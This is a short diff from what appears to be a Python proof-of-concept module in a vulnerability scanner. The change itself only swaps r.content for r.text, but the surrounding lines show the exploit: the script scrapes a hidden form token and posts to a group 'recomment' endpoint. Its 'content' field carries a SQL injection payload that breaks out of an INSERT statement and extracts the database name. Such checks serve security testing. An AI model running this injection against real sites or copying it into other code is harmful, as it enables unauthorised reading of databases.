@@ -66,8 +66,8 @@ class Poc(ABPoc):
             # 获取token
             p = re.compile(
                 r'<input type="hidden" name="([0-9a-f]+)" value="1" />')
-            if p.findall(r.content):
-                token = p.findall(r.content)[0]
+            if p.findall(r.text):
+                token = p.findall(r.text)[0]
 
                 url = self.target + '/index.php?app=group&ac=do&ts=recomment'
                 data = "token={token}&referid=1&topicid={group_id1}&content=\:',11),('22',{group_id2},'1',(select concat((DATABASE()),char(45),(md5(c)))),11),(1,{group_id3},3,'".format(
